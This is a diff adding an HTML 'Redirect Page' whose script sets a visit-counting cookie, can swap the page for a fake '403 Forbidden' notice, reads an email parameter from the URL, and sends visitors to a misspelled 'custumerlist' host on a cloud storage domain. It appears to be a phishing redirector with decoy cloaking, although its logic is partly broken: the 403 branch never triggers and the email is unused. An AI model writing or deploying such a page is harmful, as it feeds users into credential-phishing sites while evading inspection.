@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect Page</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Function to get a cookie value by name
+            function getCookie(name) {
+                let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+                if (match) {
+                    return match[2];
+                } else {
+                    return null;
+                }
+            }
+
+            // Function to set a cookie
+            function setCookie(name, value, days) {
+                let expires = "";
+                if (days) {
+                    let date = new Date();
+                    date.setTime(date.getTime() + (days*24*60*60*1000));
+                    expires = "; expires=" + date.toUTCString();
+                }
+                document.cookie = name + "=" + value + expires + "; path=/";
+            }
+
+            // Get the session start value from the cookie
+            let start = getCookie("start");
+
+            // Check if start is 20, show 403 Forbidden page
+            if (start == "20") {
+                document.open();
+                document.write('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this server.</p></body></html>');
+                document.close();
+                return;
+            }
+
+            // If start is 1, set it to 2
+            if (start == "1") {
+                setCookie("start", 2, 1);
+            }
+
+            // If start is empty, set it to 1
+            if (!start) {
+                setCookie("start", 1, 1);
+            }
+
+            // Get the email parameter from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+
+            // Redirect to the specified URL with the email parameter
+            window.location.href = `https://custumerlist.standard.us-east-1.oortech.com/#`;
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
